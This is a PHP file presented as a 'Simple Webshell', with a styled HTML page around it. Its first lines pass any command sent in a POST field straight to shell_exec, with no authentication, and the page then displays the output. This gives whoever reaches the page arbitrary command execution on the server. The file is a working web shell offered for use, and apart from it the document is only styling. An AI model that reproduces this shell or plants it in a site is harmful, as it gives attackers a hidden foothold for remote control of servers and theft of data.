<?php
// AUTHOR : MatrixTM26
// GITHUB : https://github.com/MarrixTM26

// basic form cmd input
// example of usage:
//     - input: whoami

if (isset($_POST["cmd"])) {
    $cmd = $_POST["cmd"];
    $output = shell_exec($cmd);
}
// simple html template to make output look beautifull and easy to read.
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple Webshell</title>

    <link href="https://fonts.googleapis.com/css2?family=Tourney:wght@600&family=Space+Grotesk:wght@300;400;500;700&display=swap" rel="stylesheet">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg: #000000;
            --card: #111111;
            --border: #242424;
            --border-active: #ff0000;
            --text: #ffffff;
            --text-soft: #bdbdbd;
            --danger: #ff0000;
        }

        body {
            background: var(--bg);
            color: var(--text);
            font-family: "Space Grotesk", sans-serif;
            min-height: 100vh;
            padding: 28px 16px;
        }

        .container {
            width: 100%;
            max-width: 1100px;
            margin: auto;
            display: flex;
            flex-direction: column;
            gap: 24px;
        }

        .header {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 22px;
            padding: 24px 32px;
        }

        .header h1 {
            font-family: "Tourney", cursive;
            font-size: clamp(2rem, 5vw, 3.5rem);
            color: var(--danger);
            letter-spacing: 1px;
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(2, minmax(0, 1fr));
            gap: 20px;
        }

        .card {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 22px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            gap: 18px;
        }

        .card-title {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding-bottom: 12px;
            border-bottom: 1px solid var(--border);
        }

        .card-title h2 {
            font-family: "Tourney", cursive;
            font-size: 1.3rem;
            color: var(--danger);
            letter-spacing: 1px;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 14px;
        }

        input[type="text"] {
            width: 100%;
            background: #050505;
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 12px 14px;
            color: var(--text);
            font-size: 0.92rem;
            font-family: inherit;
            outline: none;
            transition: 0.25s ease;
        }

        input[type="text"]:focus {
            border-color: var(--border-active);
            box-shadow: 0 0 0 4px rgba(255, 0, 0, 0.12);
        }

        input[type="submit"] {
            background: var(--danger);
            border: none;
            border-radius: 12px;
            padding: 12px;
            color: #ffffff;
            font-size: 0.92rem;
            font-weight: 700;
            font-family: inherit;
            cursor: pointer;
            transition: 0.25s ease;
        }

        input[type="submit"]:hover {
            background: #d10000;
            transform: translateY(-1px);
        }

        .output-box {
            background: #050505;
            border: 1px solid var(--border);
            border-radius: 14px;
            padding: 8px 10px;
            min-height: 90px;
            overflow-x: auto;
        }

        .output {
            color: #d7d7d7;
            font-size: 0.9rem;
            line-height: 1.6;
            white-space: pre-wrap;
            word-break: break-word;
        }

        .empty {
            color: #6f6f6f;
            font-size: 0.88rem;
            line-height: 1.5;
        }

        @media (max-width: 900px) {
            .grid {
                grid-template-columns: 1fr;
            }
        }

        @media (max-width: 600px) {
            body {
                padding: 16px 12px;
            }

            .container {
                gap: 16px;
            }

            .header {
                padding: 20px;
                border-radius: 18px;
            }

            .card {
                padding: 16px;
                border-radius: 18px;
                gap: 16px;
            }

            .output-box {
                padding: 6px 8px;
                min-height: 70px;
            }

            input[type="text"],
            input[type="submit"] {
                padding: 11px 12px;
            }
        }
    </style>
</head>

<body>

    <div class="container">

        <div class="header">
            <h1>SIMPLE WEBSHELL</h1>
        </div>

        <div class="grid">

            <div class="card">

                <div class="card-title">
                    <h2>CMD INPUT</h2>
                </div>

                <form method="POST">

                    <input
                        type="text"
                        name="cmd"
                        placeholder="Enter command..."
                        required
                    >

                    <input
                        type="submit"
                        value="EXECUTE"
                    >

                </form>

                <div class="output-box">

                    <?php if (!empty($cmd)): ?>

                        <div class="output">
                            <?php echo htmlspecialchars($cmd); ?>
                        </div>

                    <?php else: ?>

                        <div class="empty">
                            No command entered.
                        </div>

                    <?php endif; ?>

                </div>

            </div>

            <div class="card">

                <div class="card-title">
                    <h2>CMD OUTPUT</h2>
                </div>

                <div class="output-box">

                    <?php if (!empty($output)): ?>

                        <div class="output">
                            <?php echo htmlspecialchars($output); ?>
                        </div>

                    <?php else: ?>

                        <div class="empty">
                            Command output will appear here.
                        </div>

                    <?php endif; ?>

                </div>

            </div>

        </div>

    </div>

</body>
</html>